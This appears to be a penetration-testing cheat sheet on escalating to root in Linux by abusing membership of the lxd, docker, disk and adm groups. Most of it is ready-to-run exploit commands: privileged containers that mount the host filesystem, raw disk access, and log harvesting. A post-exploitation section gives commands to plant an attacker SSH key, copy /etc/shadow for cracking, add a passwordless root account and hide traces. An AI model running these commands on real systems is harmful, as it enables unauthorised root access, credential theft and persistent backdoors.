### 1. Technique Name:

Privileged Group Membership â€“ Abusing `lxd`, `docker`, `disk`, and `adm` Groups for Privilege Escalation
### 2. Summary:

On Linux systems, certain groups grant elevated or sensitive capabilities to their members. If a user is part of one of these privileged groups (such as `lxd`, `docker`, `disk`, or `adm`), they can often escalate to root or access critical system information.

This technique explores how to exploit group memberships to:

- Spawn privileged containers and mount the host filesystem (`lxd`, `docker`)    
- Directly access block devices (`disk`)
- Read sensitive logs (`adm`)
### 3. Conditions / Requirements:

- The target user must belong to one of the following groups: `lxd`, `docker`, `disk`, `adm`    
- The required tools (`lxc`, `docker`, etc.) must be installed
- Local shell access to the target system  
### 4. Enumeration Steps:
#### A. Check group memberships:

```bash
id
```
#### B. Review `/etc/group` for potentially dangerous group assignments:

```bash
grep -E 'docker|lxd|disk|adm' /etc/group
```
### 5. Exploitation Steps
#### A. **LXD Group Abuse**

If user belongs to `lxd`:

```bash
# Check group
id | grep lxd

# Import Alpine image
unzip alpine.zip
lxc image import alpine.tar.gz alpine.tar.gz.root --alias alpine

# Start privileged container
lxc init alpine r00t -c security.privileged=true

# Mount host FS
lxc config device add r00t mydev disk source=/ path=/mnt/root recursive=true

# Launch and gain root shell inside container
lxc start r00t
lxc exec r00t /bin/sh
```

You now have full access to `/mnt/root` (host root filesystem).
#### B. **Docker Group Abuse**

If user belongs to `docker`:

```bash
# Start container and mount host root
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
```

Now you are inside the host's root filesystem with root privileges.
#### C. **Disk Group Abuse**

If user belongs to `disk`:

```bash
# Enumerate block devices
lsblk

# Mount disk directly
sudo mount /dev/sda1 /mnt  # If not already mounted

# OR use debugfs for raw access
sudo debugfs /dev/sda1
```

You can read raw files and copy `/etc/shadow`, SSH keys, etc.
#### D. **ADM Group Abuse**

If user belongs to `adm`:

```bash
# Read sensitive logs
cat /var/log/auth.log
cat /var/log/syslog
```

You may find:

- User login activity
- Cron job schedules    
- Application logs with passwords or tokens
### 6. Post-Exploitation Tips:

- Drop an SSH key for persistence (if root access is gained):

```bash
echo 'ssh-rsa AAAA... attacker@box' >> /mnt/root/root/.ssh/authorized_keys
```

- Copy password hashes for offline cracking:
   
```bash
cp /mnt/root/etc/shadow .
```

- Add a root user:

```bash
echo 'haxor::0:0:root:/root:/bin/bash' >> /mnt/root/etc/passwd
```

- Clean up containers or temp files if stealth is desired
### 7. Example / Notes:

- LXD group escalation:  

```bash
lxc exec r00t /bin/sh
~ # id
uid=0(root) gid=0(root)
```

- Docker privilege escalation:

```bash
docker run -v /:/mnt --rm -it ubuntu chroot /mnt bash
# id
uid=0(root) gid=0(root)
```
# Tags
> #Linux-Post-Exploitation #Linux-Privesc #Privileged_Groups